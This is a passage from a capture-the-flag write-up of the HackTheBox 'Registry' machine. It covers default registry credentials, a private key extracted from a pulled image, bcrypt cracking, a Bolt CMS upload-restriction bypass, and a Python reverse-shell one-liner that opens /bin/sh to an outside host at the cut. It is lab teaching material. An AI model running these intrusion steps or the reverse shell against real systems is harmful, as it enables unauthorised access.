readme.md</span><br></pre></td></tr></table></figure><p><em>Note: Another way to access archive content when the archive seems corrupted it to use <code>zcat</code>:</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ zcat install</span><br><span class="line">ca.crt0000775000004100000410000000210613464123607012215 0ustar  www-datawww-data-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV</span><br><span class="line">[...]</span><br><span class="line">QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">readme.md0000775000004100000410000000020113472260460012667 0ustar  www-datawww-data<span class="comment"># Private Docker Registry</span></span><br><span class="line"></span><br><span class="line">- https://docs.docker.com/registry/deploying/</span><br><span class="line">- https://docs.docker.com/engine/security/certificates/</span><br><span class="line"></span><br><span class="line">gzip: install: unexpected end of file</span><br></pre></td></tr></table></figure><p>So we got two files unzipped, a certificate <code>ca.crt</code> and a readme file <code>readme.md</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ cat ca.crt</span><br><span class="line">-----BEGIN CERTIFICATE-----</span><br><span class="line">MIIC/DCCAeSgAwIBAgIJAIFtFmFVTwEtMA0GCSqGSIb3DQEBCwUAMBMxETAPBgNV</span><br><span class="line">[...]</span><br><span class="line">QMPjq1S5SqXJqzop4OnthgWlwggSe/6z8ZTuDjdNIpx0tF77arh2rUOIXKIerx5B</span><br><span class="line">-----END CERTIFICATE-----</span><br><span class="line">[hg8@archbook ~]$ cat readme.md</span><br><span class="line"><span class="comment"># Private Docker Registry</span></span><br><span class="line"></span><br><span class="line">- https://docs.docker.com/registry/deploying/</span><br><span class="line">- https://docs.docker.com/engine/security/certificates/</span><br></pre></td></tr></table></figure><p>The readme links to two pieces of documentation:</p><ol><li><p>Deployment of a private docker registry.</p></li><li><p>Verifying repository client with certificates</p></li></ol><p>These documentation make sense of what we found so far, <code>docker.registry.htb</code> is probably the API of a private docker registry, while the <code>ca.crt</code> might be used to connect to the registry securely. </p><h3 id="Docker-Registry"><a href="#Docker-Registry" class="headerlink" title="Docker Registry"></a>Docker Registry</h3><p>Now that we have an idea of what’s going on <code>docker.registry.htb</code> let’s make a bit of recon to see what we can do with this instance. First let’s run <code>gobuster</code> to see if we can find useful endpoints:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">"https://docker.registry.htb/"</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php -k</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/v2 (Status: 301)</span><br><span class="line">===============================================================</span><br><span class="line">2020/01/27 11:11:10 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure><p>This <code>/v2</code>  endpoint confirms we are looking at an API. Let’s continue:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -i docker.registry.htb/v2/</span><br><span class="line">HTTP/1.1 401 Unauthorized</span><br><span class="line">Server: nginx/1.14.0 (Ubuntu)</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 87</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Docker-Distribution-Api-Version: registry/2.0</span><br><span class="line">Www-Authenticate: Basic realm=<span class="string">"Registry"</span></span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">"errors"</span>:[&#123;<span class="string">"code"</span>:<span class="string">"UNAUTHORIZED"</span>,<span class="string">"message"</span>:<span class="string">"authentication required"</span>,<span class="string">"detail"</span>:null&#125;]&#125;</span><br></pre></td></tr></table></figure><p>Searching for this error redirect us to the valuable <a href="https://docs.docker.com/registry/spec/api/" target="_blank" rel="noopener">Docker Registry API documentation</a> which will probably be super useful soon: </p><blockquote><p>If a <code>401 Unauthorized</code> response is returned, the client should take action based on the contents of the “WWW-Authenticate” header and try the endpoint again. Depending on access control setup, the client may still have to authenticate against different resources, even if this check succeeds.</p></blockquote><p><code>Www-Authenticate</code> that got returned to us indicate we have to authenticate through a <code>Basic</code> authentication method. We didn’t find any username or password yet so… let’s try the classic <code>admin:admin</code>?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -i -u admin:admin docker.registry.htb/v2/</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.14.0 (Ubuntu)</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 2</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Docker-Distribution-Api-Version: registry/2.0</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">Strict-Transport-Security: max-age=63072000; includeSubdomains</span><br><span class="line">X-Frame-Options: DENY</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line"></span><br><span class="line">&#123;&#125;%</span><br></pre></td></tr></table></figure><p>Alright! We have access to the Docker API Registry, the next logical step is to see if any docker image is stored on this registry. According to the documentation we can do so using the <code>_catalog</code> endpoint:</p><blockquote><p>Images are stored in collections, known as a <em>repository</em>, which is keyed by a <code>name</code>, as seen throughout the API specification. A registry instance may<br>contain several repositories. The list of available repositories is made<br>available through the <em>catalog</em>.</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl -u admin:admin http://docker.registry.htb/v2/_catalog</span><br><span class="line">&#123;<span class="string">"repositories"</span>:[<span class="string">"bolt-image"</span>]&#125;</span><br></pre></td></tr></table></figure><p>Great there is indeed an image, let’s pull it to investigate its content:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ docker pull docker.registry.htb/bolt-image</span><br><span class="line">Using default tag: latest</span><br><span class="line">Error response from daemon: Get https://docker.registry.htb/v2/: x509: certificate signed by unknown authority</span><br></pre></td></tr></table></figure><p>New error, certificate error…</p><p>Remember we found a documentation link and a certificate in the <code>install</code> archive? Let’s take a look, the solution is surely inside:</p><blockquote><p>A custom certificate is configured by creating a directory under <code>/etc/docker/certs.d</code> using the same name as the registry’s hostname, such as <code>localhost</code>. All <code>*.crt</code> files are added to this directory as CA roots.</p></blockquote><p>Let’s do this with the certificate we got in <code>install</code> archive:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo mkdir -p /etc/docker/certs.d/docker.registry.htb</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ sudo mv ca.crt /etc/docker/certs.d/docker.registry.htb/ca.crt</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ docker pull docker.registry.htb/bolt-image</span><br><span class="line">Using default tag: latest</span><br><span class="line">Error response from daemon: Get https://docker.registry.htb/v2/bolt-image/manifests/latest: no basic auth credentials</span><br></pre></td></tr></table></figure><p>We are getting closer! Let’s login to the docker using the <code>admin:admin</code> credentials:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ docker login -u admin -p admin http://docker.registry.htb</span><br><span class="line">WARNING! Using --password via the CLI is insecure. Use --password-stdin.</span><br><span class="line">WARNING! Your password will be stored unencrypted <span class="keyword">in</span> /home/hg8/.docker/config.json.</span><br><span class="line">Configure a credential helper to remove this warning. See</span><br><span class="line">https://docs.docker.com/engine/reference/commandline/login/<span class="comment">#credentials-store</span></span><br><span class="line"></span><br><span class="line">Login Succeeded</span><br></pre></td></tr></table></figure><p>Everything should now be in order, let’s pull this damn image:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ docker pull docker.registry.htb/bolt-image</span><br><span class="line">Using default tag: latest</span><br><span class="line">latest: Pulling from bolt-image</span><br><span class="line">f476d66f5408: Pull complete</span><br><span class="line">302bfcb3f10c: Pull complete</span><br><span class="line">Digest: sha256:eeff225e5fae33dc832c3f82fd8b0db363a73eac4f0f0cb587094be54050539b</span><br><span class="line">Status: Downloaded newer image <span class="keyword">for</span> docker.registry.htb/bolt-image:latest</span><br><span class="line">docker.registry.htb/bolt-image:latest</span><br><span class="line"></span><br><span class="line">[hg8@archbook ~]$ docker images</span><br><span class="line">REPOSITORY                       TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">docker.registry.htb/bolt-image   latest              601499e98a60        8 months ago        362MB</span><br></pre></td></tr></table></figure><p>Looks all good now! We pulled the image and it can be ran locally. We can now start it and get a shell inside, so we can recon for interesting files:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ docker run -it 601499e98a60 /bin/bash</span><br><span class="line"></span><br><span class="line">root@6467ad831f74:/<span class="comment"># cd /root</span></span><br><span class="line">root@6467ad831f74:~<span class="comment"># ls -la</span></span><br><span class="line">total 28</span><br><span class="line">drwx------ 1 root root 4096 Jan 27 13:14 .</span><br><span class="line">drwxr-xr-x 1 root root 4096 Jan 27 13:08 ..</span><br><span class="line">lrwxrwxrwx 1 root root    9 May 25  2019 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc</span><br><span class="line">-rw-r--r-- 1 root root  148 May 25  2019 .profile</span><br><span class="line">drwxr-xr-x 2 root root 4096 May 25  2019 .ssh</span><br><span class="line">-rw------- 1 root root 1061 May 25  2019 .viminfo</span><br><span class="line">-rw-r--r-- 1 root root  215 Jan 27 13:14 .wget-hsts</span><br><span class="line">root@19e33fc3a2fa:~<span class="comment"># ls -a .ssh/</span></span><br><span class="line">.  ..  config  id_rsa  id_rsa.pub  known_hosts</span><br><span class="line">root@19e33fc3a2fa:~<span class="comment"># cat .ssh/config</span></span><br><span class="line">Host registry</span><br><span class="line">  User bolt</span><br><span class="line">  Port 22</span><br><span class="line">  Hostname registry.htb</span><br><span class="line">root@19e33fc3a2fa:~<span class="comment"># cat .ssh/id_rsa</span></span><br><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9</span><br><span class="line"></span><br><span class="line">KF9YHXRjDZ35Q9ybzkhcUNKF8DSZ+aNLYXPL3kgdqlUqwfpqpbVdHbMeDk7qbS7w</span><br><span class="line">[...]</span><br><span class="line">94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWS+OLDh7lrcmm+GP54MsLBWVpr</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>We have an<code>.ssh/</code> folder with private key and a username  <code>bolt</code> for <code>registry.htb</code> host. Looks a little too easy but let’s give a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa bolt@registry.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'id_rsa'</span>:</span><br></pre></td></tr></table></figure><p>Of course it was too easy, the key need a passphrase and we didn’t find any yet… In these situations I usually try to run <code>john</code> to quickly brute-force the passphrase:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh2john id_rsa &gt; id_rsa.hash</span><br><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">0g 0:00:00:18 DONE (2020-01-31 15:29) 0g/s 792796p/s 792796c/s 792796C/s </span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>No luck here. To be honest it took me too much time to find this passphrase but, as usual, recon is always the key to progress and finally:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@02c3e9ee87d2:/<span class="comment"># grep -ri "passphrase" 2&gt;/dev/null</span></span><br><span class="line">[...]</span><br><span class="line">etc/profile.d/01-ssh.sh:expect <span class="string">"Enter passphrase for /root/.ssh/id_rsa:"</span></span><br><span class="line">root@02c3e9ee87d2:/<span class="comment"># cat etc/profile.d/01-ssh.sh</span></span><br><span class="line"><span class="comment">#!/usr/bin/expect -f</span></span><br><span class="line"><span class="comment">#eval `ssh-agent -s`</span></span><br><span class="line">spawn ssh-add /root/.ssh/id_rsa</span><br><span class="line">expect <span class="string">"Enter passphrase for /root/.ssh/id_rsa:"</span></span><br><span class="line">send <span class="string">"GkOcz221Ftb3ugog\n"</span>;</span><br><span class="line">expect <span class="string">"Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"</span></span><br><span class="line">interact</span><br></pre></td></tr></table></figure><blockquote><p>ssh-add is a command for adding SSH private keys into the SSH authentication agent for implementing single sign-on with SSH. </p></blockquote><p>As a reminder:</p><blockquote><p> /etc/profile<br>            The systemwide initialization file, executed for login shells</p></blockquote><p>When looking in the <code>/etc/profile</code> we can see that all scripts in <code>/etc/profile.d/</code> are executed on login time:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@02c3e9ee87d2:/<span class="comment"># cat /etc/profile</span></span><br><span class="line">[...]</span><br><span class="line"><span class="keyword">if</span> [ -d /etc/profile.d ]; <span class="keyword">then</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> /etc/profile.d/*.sh; <span class="keyword">do</span></span><br><span class="line">    <span class="keyword">if</span> [ -r <span class="variable">$i</span> ]; <span class="keyword">then</span></span><br><span class="line">      . <span class="variable">$i</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">  <span class="keyword">done</span></span><br><span class="line">  <span class="built_in">unset</span> i</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>We now understand why this <code>ssh-add</code> command is made on login, the combination of <code>ssh-agent</code> and <code>ssh-add</code> allow the user to connect to any server he is allowed to access without having to type in a password every time when moving between servers. </p><p>Well now that we have all the needed informations, let’s try to login to SSH again:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ssh -i id_rsa bolt@registry.htb</span><br><span class="line">Enter passphrase <span class="keyword">for</span> key <span class="string">'./id_rsa'</span>:</span><br><span class="line">Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)</span><br><span class="line"></span><br><span class="line">  System information as of Mon Jan 27 14:42:39 UTC 2020</span><br><span class="line"></span><br><span class="line">  System load:  0.02              Users logged <span class="keyword">in</span>:                0</span><br><span class="line">  Usage of /:   5.6% of 61.80GB   IP address <span class="keyword">for</span> eth0:            10.10.10.159</span><br><span class="line">  Memory usage: 21%               IP address <span class="keyword">for</span> br-1bad9bd75d17: 172.18.0.1</span><br><span class="line">  Swap usage:   0%                IP address <span class="keyword">for</span> docker0:         172.17.0.1</span><br><span class="line">  Processes:    154</span><br><span class="line">Last login: Mon Oct 21 10:31:48 2019 from 10.10.14.2</span><br><span class="line">bolt@bolt:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">bolt@bolt:~$ cat user.txt</span><br><span class="line">yxxxxxxxxxxxxxxxxxxxxxxxxxi</span><br></pre></td></tr></table></figure><h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><p>Alright! Now that we have access to <code>bolt</code> account. It’s time to escalate it to root.</p><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>The usual quick  recon shows that <code>bolt</code> user doesn’t seems to hold anything very valuable. Let’s investigate the <code>/var/www/html/</code> directory to take a look at this <code>backup.php</code> file we found during the user recon phase:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ cat /var/www/backup.php</span><br><span class="line">&lt;?php shell_exec(<span class="string">"sudo restic backup -r rest:http://backup.registry.htb/bolt bolt"</span>);</span><br></pre></td></tr></table></figure><p>Alright so this php file is calling an external command to make backup it seems. The interesting point here is that the command is launched as root using <code>sudo</code>. That mean if we can find a flaw in the command we can very probably elevate our privileges to root.</p><p>Unfortunately as <code>bolt</code> user we can not run this command without inputting password. Seeing the <code>backup.php</code> file we can guess with good confidence that <code>sudo</code> have been configured to allow the Apache user (<code>www-data</code>) to run the <code>sudo</code> backup command without inputing password. This way the <code>backup.php</code> script can be run automatically through cronjob for example.</p><p>So now we need to find a way to pivot to <code>www-data</code> user to exploit this backup script. Let’s investigate.</p><h3 id="Pivot-bolt-gt-www-data"><a href="#Pivot-bolt-gt-www-data" class="headerlink" title="Pivot bolt -&gt; www-data"></a>Pivot bolt -&gt; www-data</h3><p>While looking in the <code>/var/www/html/</code> directory we find a <code>bolt/</code> folder. This one was missed by <code>gobuster</code> during our recon phase.</p><p>So what’s this bolt?<br>Opening <code>https://registry.htb/bolt</code> display an empty sample website:</p><p><img src="https://user-images.githubusercontent.com/9076747/75478718-ba171080-599e-11ea-8a71-450c96466f93.png" alt="bolt sample website"></p><p>A quick Google search gives us additional information about what Bolt is: </p><blockquote><p>Bolt is a free, open-source content management system based on PHP. It was released in 2012 and developed by Two Kings and the Bolt community. Bolt uses Twig for templates and includes features for content and user management.<br><a href="https://bolt.cm/" target="_blank" rel="noopener">Bolt.cm</a></p></blockquote><p>I will add it to my usual recon list to make sure not missing it next time:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> bolt &gt;&gt; ~/SecLists/Discovery/Web-Content/big.txt</span><br></pre></td></tr></table></figure><p>Reading through the documentation we can see that the admin interface is available at <a href="https://registry.htb/bolt/bolt" target="_blank" rel="noopener">https://registry.htb/bolt/bolt</a> :</p><p><img src="https://user-images.githubusercontent.com/9076747/75478994-2134c500-599f-11ea-8b40-09e1489b3d57.png" alt="bolt admin page"></p><p>No common password combination seems to work here. No need to loose time brute-forcing, since we have access the app code source through the <code>bolt</code> ssh user account let’s dig a bit there to see if we can find any interesting config files.</p><p>Looking around we quickly stumble across <code>bolt</code> sqli database in <code>/var/www/html/bolt/database/bolt.db</code>.</p><p>Let’s take a look inside for juicy information:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sqlite3 bolt.db</span><br><span class="line">SQLite version 3.30.1 2019-10-10 20:19:45</span><br><span class="line">Enter <span class="string">".help"</span> <span class="keyword">for</span> usage hints.</span><br><span class="line">sqlite&gt; .tables</span><br><span class="line">bolt_authtoken    bolt_field_value  bolt_pages        bolt_users</span><br><span class="line">bolt_blocks       bolt_homepage     bolt_relations</span><br><span class="line">bolt_cron         bolt_log_change   bolt_showcases</span><br><span class="line">bolt_entries      bolt_log_system   bolt_taxonomy</span><br><span class="line">sqlite&gt; SELECT * FROM bolt_users;</span><br><span class="line">1|admin|<span class="variable">$2y</span><span class="variable">$10</span><span class="variable">$e</span>.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2019-10-17 14:34:52|10.10.14.2|Admin|[<span class="string">"files://shell.php"</span>]|1||||0||[<span class="string">"root"</span>,<span class="string">"everyone"</span>]</span><br><span class="line">sqlite&gt;</span><br></pre></td></tr></table></figure><p>The first thing that catch the attention is this <code>bolt_users</code> table. Inside we grab the password hash of user <code>Admin</code>.  </p><p>Let’s try to crack it using <code>john</code>:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ john --wordlist=~/SecLists/Passwords/Leaked-Databases/rockyou.txt admin.hash</span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">"bcrypt"</span>, but the string is also recognized as <span class="string">"bcrypt-opencl"</span></span><br><span class="line">Use the <span class="string">"--format=bcrypt-opencl"</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (bcrypt [Blowfish 32/64 X3])</span><br><span class="line">Cost 1 (iteration count) is 1024 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">strawberry       (?)</span><br><span class="line">1g 0:00:00:09 DONE (2020-01-27 16:03) 0.1072g/s 36.69p/s 36.69c/s 36.69C/s strawberry..ihateyou</span><br><span class="line">Use the <span class="string">"--show"</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure><p>Bingo! So, we got <code>Admin:strawberry</code>, using those credentials in the admin login page works.   </p><p><img src="https://user-images.githubusercontent.com/9076747/75479875-8e952580-59a0-11ea-9bb0-54ca89137950.png" alt="bolt admin dashboard"></p><p>Looking around at the various settings we quickly come across the “File Management” setting, allowing us to upload file to the server. Sounds good to upload a web shell don’t you think? </p><p>First thing to try is to send a <code>.php</code> file to see if we can execute php on the server:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;?php phpinfo();"</span> &gt; test.php</span><br></pre></td></tr></table></figure><p>Unfortunately when trying to upload we receive the following error message:</p><p><img src="https://user-images.githubusercontent.com/9076747/75480049-e2077380-59a0-11ea-9eec-d5a3d1555d77.png" alt="bolt upload failure"></p><p>No php allowed. At this point I tried various way to bypass the file upload restrictions:</p><ul><li>Changing extension (<code>test.PHp</code>, <code>test.php7</code> since server runs PHP7)</li><li>Content-type bypass</li><li>Double extension (<code>test.php.jpg</code>, <code>test.jpg.php</code>)</li><li>Null Character (<code>test.php%00.jpg</code>)</li><li>Using GIF89a; header</li></ul><p>But didn’t managed to get any of this to work. Searching a bit farther we discover that it’s possible to change the allowed extension list in “Configuration/Main Configuration”. Even though a comment state <code>.php</code> extension are “never acceptable”, adding it to the list seems to work and let us upload php file:</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Note that certain file-types are never acceptable, even if they are in this list. </span></span><br><span class="line"><span class="comment"># These types are never allowed: sh, asp, cgi, php, php3, ph3, php4, ph4, php5, ph5, </span></span><br><span class="line"><span class="comment"># phtm, phtml</span></span><br><span class="line"><span class="attr">accept_file_types:</span> <span class="string">[</span> <span class="string">php,</span> <span class="string">twig,</span> <span class="string">html,</span> <span class="string">js,</span> <span class="string">css,</span> <span class="string">scss,</span> <span class="string">gif,</span> <span class="string">jpg,</span> <span class="string">jpeg,</span> <span class="string">png,</span> <span class="string">ico,</span> <span class="string">zip,</span> <span class="string">tgz,</span> <span class="string">txt,</span> <span class="string">md,</span> <span class="string">doc,</span> <span class="string">docx,</span> <span class="string">pdf,</span> <span class="string">epub,</span> <span class="string">xls,</span> <span class="string">xlsx,</span> <span class="string">ppt,</span> <span class="string">pptx,</span> <span class="string">mp3,</span> <span class="string">ogg,</span> <span class="string">wav,</span> <span class="string">m4a,</span> <span class="string">mp4,</span> <span class="string">m4v,</span> <span class="string">ogv,</span> <span class="string">wmv,</span> <span class="string">avi,</span> <span class="string">webm,</span> <span class="string">svg]</span></span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/9076747/75481560-8c809600-59a3-11ea-8b0a-7a2c2c7f88ec.png" alt="bolt php file upload"></p><p>The php file is now accessible at <code>https://registry.htb/bolt/files/hg8.php</code>:</p><p><img src="https://user-images.githubusercontent.com/9076747/75481639-aae69180-59a3-11ea-8154-75163f358616.png" alt="bolt php file upload"></p><p>Good, we are on the right track to upload a web shell. Unfortunately it’s not that simple, the uploaded files gets deleted and configuration file reset every 1 minute or so, making it impossible to use a web shell. The good news is we do have an access to the server on ssh as <code>bolt</code> user, here is how we can proceed to get a stable shell:</p><ol><li>Create a reverse shell script with the <code>bolt</code> account on the server <code>/tmp</code> folder.</li><li>Upload a <code>.php</code> file executing this script.</li></ol><p>This way we get a reverse that will be executed as <code>www-data</code> and will stay up even after the <code>.php</code> file gets deleted. Here is one way to do so:</p><p>First let’s create the reverse shell script. I will use Python one:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bolt@bolt:/$ cat /tmp/hg8.py</span><br><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",8585));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br><span class="line">bolt@bolt:/$ <span class="built_in">which</span> 